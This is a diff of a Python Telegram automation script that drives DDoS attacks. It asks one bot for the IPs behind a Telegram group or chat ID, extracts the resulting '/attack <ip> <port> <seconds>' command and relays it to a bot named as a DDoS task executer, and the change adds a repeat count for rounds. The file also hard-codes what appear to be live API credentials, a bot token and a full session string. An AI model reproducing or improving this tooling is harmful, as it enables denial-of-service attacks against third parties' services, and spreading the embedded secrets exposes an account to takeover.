@@ -11,7 +11,7 @@ API_ID = 36295148
 API_HASH = "bee66be844e3be0e314508e92a7c4e7d"
 BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"
 
-BOT_A = "@botbysahilbot"          # IP BOT
+BOT_A = "@botbysahilbot"          # IP BOT (TARGET_BOT in old code)
 BOT_B = "@DDOS_Aditya_xd_bot"     # TASK EXECUTER BOT
 
 STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XNO1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2snpHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8vQoZm6h2HLUIOwZLZRugWZ-_iRiaYiU="
@@ -19,39 +19,36 @@ STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qU
 tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 
 # PTB side state
-chat_targets: dict[int, str] = {}          # chat_id -> target
-loop_tasks: dict[int, asyncio.Task] = {}   # chat_id -> telethon loop task
+chat_targets: dict[int, str] = {}          # chat_id -> link_or_chatid
+chat_counts: dict[int, int] = {}           # chat_id -> number of rounds
+loop_tasks: dict[int, asyncio.Task] = {}   # chat_id -> loop task
 
-# BOT_A response waiters (same idea as old code)
-ip_waiters: dict[int, asyncio.Future] = {}  # chat_id -> Future for CMD
+# Old-code style: per chat future
+ip_waiters: dict[int, asyncio.Future] = {}  # chat_id -> Future for CMD from BOT_A
 bot_b_status = "UNKNOWN"
 
-# /attack extract from "CMD: /attack 91.108.17.5 32001 30"
-CMD_LINE_REGEX = re.compile(r"CMD:s*`?(/attacks+S+s+d+s+d+)`?", re.I)
-
-
-# ------------- BOT-A LISTENER (IP BOT) -------------
+# -------- IP BOT LISTENER (same idea as working code) --------
 @tele.on(events.NewMessage(from_users=BOT_A))
-async def bot_a_listener(event):
+async def ip_bot_listener(event):
     text = event.text or ""
-    print("IP BOT REPLY:", text)
+    print("📩 IP BOT REPLY:", text)
 
-    # Purane code ki tarah CMD line nikaalo
-    m = CMD_LINE_REGEX.search(text)
+    # Simple CMD line extraction (works with: CMD: /attack ...)
+    m = re.search(r"CMD:s*(.+)", text)
     if not m:
         return
 
-    attack_cmd = m.group(1)
-    print("✅ EXTRACTED CMD:", attack_cmd)
+    final_cmd = m.group(1).strip()
+    print("✅ FINAL CMD:", final_cmd)
 
-    # Sare pending chats ko CMD de do (per-chat mapping)
+    # Resolve all pending chats (same idea as last_requests)
     for chat_id, fut in list(ip_waiters.items()):
         if not fut.done():
-            fut.set_result(attack_cmd)
+            fut.set_result(final_cmd)
         ip_waiters.pop(chat_id, None)
 
 
-# ------------- BOT-B LISTENER (TASK BOT) -------------
+# -------- BOT_B LISTENER --------
 @tele.on(events.NewMessage(from_users=BOT_B))
 async def bot_b_listener(event):
     global bot_b_status
@@ -66,57 +63,128 @@ async def bot_b_listener(event):
         bot_b_status = "UNKNOWN"
 
 
-# ------------- CORE LOOP PER CHAT (Telethon loop) -------------
+# -------- CORE LOOP PER CHAT (uses old IP logic) --------
 async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
-    """Har chat ke liye: IP BOT se CMD lo, BOT_B ko bhejo, loop repeat."""
+    """Har chat ke liye: IP BOT se CMD le, BOT_B ko bhej, count bar repeat."""
     global bot_b_status
 
-    while True:
-        target = chat_targets.get(chat_id)
-        if not target:
-            return
+    target = chat_targets.get(chat_id)
+    if not target:
+        await context.bot.send_message(
+            chat_id,
+            "❌ Target not set, use /setlinkchatid first."
+        )
+        return
 
-        # 1) IP BOT se .getip all <target> maango
+    count = chat_counts.get(chat_id, 1)
+    await context.bot.send_message(
+        chat_id,
+        (
+            "🔁 Loop configured.
+"
+            f"Target: `{target}`
+"
+            f"Rounds: {count}"
+        ),
+        parse_mode="Markdown",
+    )
+
+    for i in range(count):
+        # 1) Send `.getip all` to IP BOT (same as working getip_cmd)
+        await context.bot.send_message(
+            chat_id,
+            (
+                f"➡️ Round {i+1}/{count}:
+"
+                f"Sending `.getip all {target}` to IP BOT…"
+            ),
+            parse_mode="Markdown",
+        )
+
         fut = tele.loop.create_future()
         ip_waiters[chat_id] = fut
 
         await tele.send_message(BOT_A, f".getip all {target}")
-        await context.bot.send_message(chat_id, "📡 Asking IP bot for CMD…")
 
         try:
-            attack_cmd = await asyncio.wait_for(fut, timeout=60)
+            final_cmd = await asyncio.wait_for(fut, timeout=60)
         except asyncio.TimeoutError:
-            await context.bot.send_message(chat_id, "⏱️ IP bot timeout, retrying…")
+            await context.bot.send_message(
+                chat_id,
+                "⏱️ Timeout: No CMD from IP BOT, skipping this round…"
+            )
             ip_waiters.pop(chat_id, None)
-            await asyncio.sleep(5)
             continue
 
-        # 2) BOT_B READY hone tak wait
+        await context.bot.send_message(
+            chat_id,
+            (
+                "📥 IP BOT CMD received:
+"
+                f"`{final_cmd}`"
+            ),
+            parse_mode="Markdown",
+        )
+
+        # 2) Wait until BOT_B is READY
+        await context.bot.send_message(
+            chat_id,
+            "🔎 Checking BOT_B `/status` until READY…"
+        )
+
         while True:
             await tele.send_message(BOT_B, "/status")
             await asyncio.sleep(2)
             if bot_b_status == "READY":
                 break
+            await context.bot.send_message(
+                chat_id,
+                (
+                    "⏸ BOT_B status: "
+                    f"{bot_b_status} (waiting 5s…)"
+                )
+            )
             await asyncio.sleep(5)
 
-        # 3) BOT_B ko /attack bhejo
-        await tele.send_message(BOT_B, attack_cmd)
+        # 3) Send CMD to BOT_B
+        await tele.send_message(BOT_B, final_cmd)
         await context.bot.send_message(
             chat_id,
-            f"✅ Task sent:`{attack_cmd}`",
+            (
+                "🚀 Sent to BOT_B:
+"
+                f"`{final_cmd}`"
+            ),
             parse_mode="Markdown",
         )
         await asyncio.sleep(3)
 
+    await context.bot.send_message(chat_id, "✅ All rounds finished.")
+    loop_tasks.pop(chat_id, None)
 
-# ------------- PTB COMMANDS -------------
+
+# -------- PTB COMMANDS --------
 async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        await update.message.reply_text("Usage: /setlinkchatid <group_link_or_chatid>")
+        await update.message.reply_text(
+            "Usage: /setlinkchatid <group_link_or_chatid>"
+        )
         return
 
     chat_targets[update.effective_chat.id] = " ".join(context.args)
     await update.message.reply_text("✅ Link / ChatID saved")
+
+
+async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args or not context.args[0].isdigit():
+        await update.message.reply_text(
+            "Usage: /setcount <number_of_attacks>"
+        )
+        return
+
+    n = max(1, int(context.args[0]))
+    chat_counts[update.effective_chat.id] = n
+    await update.message.reply_text(f"✅ Count set to {n}")
 
 
 async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -140,7 +208,7 @@ async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("No active loop running")
 
 
-# ------------- TELETHON RUNNER (SEPARATE THREAD) -------------
+# -------- TELETHON RUNNER (separate thread, same as pehle) --------
 def start_telethon():
     asyncio.run(run_telethon())
 
@@ -151,13 +219,13 @@ async def run_telethon():
     await tele.run_until_disconnected()
 
 
-# ------------- MAIN (SYNC PTB) -------------
 def main():
     t = threading.Thread(target=start_telethon, daemon=True)
     t.start()
 
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("setlinkchatid", setlink))
+    app.add_handler(CommandHandler("setcount", setcount))
     app.add_handler(CommandHandler("startloop", startloop))
     app.add_handler(CommandHandler("stoploop", stoploop))
 
